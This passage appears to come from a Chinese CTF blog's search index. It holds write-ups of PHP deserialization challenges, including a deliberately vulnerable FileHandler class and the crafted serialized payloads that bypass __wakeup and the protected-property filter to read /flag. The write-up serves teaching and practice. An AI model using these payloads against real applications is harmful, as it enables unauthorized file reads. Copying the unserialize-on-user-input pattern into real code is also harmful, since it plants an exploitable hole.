class="string">&quot;\n&quot;</span>;</span><br><span class="line">$a = str_replace(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>,$a);</span><br><span class="line">$a  =  str_replace(<span class="string">&#x27;:1:&#x27;</span>,<span class="string">&#x27;:2:&#x27;</span>,$a);</span><br><span class="line"><span class="keyword">echo</span> base64_encode($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQo=</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/07/30/anaal9.png" alt="anaal9.png"></p><h3 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h3><p><strong>私有属性绕过</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $filename = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        $content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();       </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (<span class="keyword">string</span>)$_GET[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ord() 函数返回字符串的首个字符的 ASCII 值。</p><p>file_get_contents() 把整个文件读入一个字符串中。</p></blockquote><p>要利用read()的file_get_contents()读取flag.php，即<code>/flag</code></p><p>所以process()的$op==”2”，然后通过output()输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $op = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> $filename = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> $content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> FileHandler;</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>把输出的$b适当修改，得到payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;s:5:&quot;&#x2F;flag&quot;;S:10:&quot;\00*\00content&quot;;s:12:&quot;Hello%20World!&quot;;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
